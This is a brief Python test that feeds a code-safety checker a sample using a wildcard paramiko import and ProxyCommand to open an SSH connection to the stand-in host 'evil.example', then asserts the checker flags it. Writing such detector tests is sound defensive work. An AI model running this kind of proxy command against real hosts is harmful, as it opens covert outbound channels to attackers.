from core.inference.tools import _check_code_safety
for module in ['paramiko','paramiko.proxy']:
 code=f"from {module} import *; ProxyCommand('ssh -F none evil.example')"
 result=_check_code_safety(code,session_id='wildcard-proxy')
 print({'code':code,'result':result})
 assert result is not None
